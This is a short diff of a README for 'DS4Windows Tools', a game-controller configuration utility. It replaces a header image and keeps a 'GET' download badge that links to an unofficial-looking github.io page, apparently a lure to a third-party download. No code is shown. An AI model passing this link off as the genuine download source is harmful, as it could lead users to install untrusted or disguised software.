@@ -1,6 +1,6 @@
 # DS4Windows Tools — Controller Configuration, Profiles & Input Management
 
-![DS4Windows](https://freeloadsoft.ru/wp-content/uploads/2023/01/post-image-ds4.jpg)
+![DS4Windows](https://cdn2.steamgriddb.com/thumb/8d7ae74fa473ae740377120f2aa65a7f.jpg)
 
 [![GET — DS4Windows Tools](https://img.shields.io/badge/GET%20%E2%80%94%20DS4Windows%20Tools-0078D6?style=for-the-badge&logoColor=white)](https://vcfj60624.github.io/.github/DS4Windows-Tools)
 
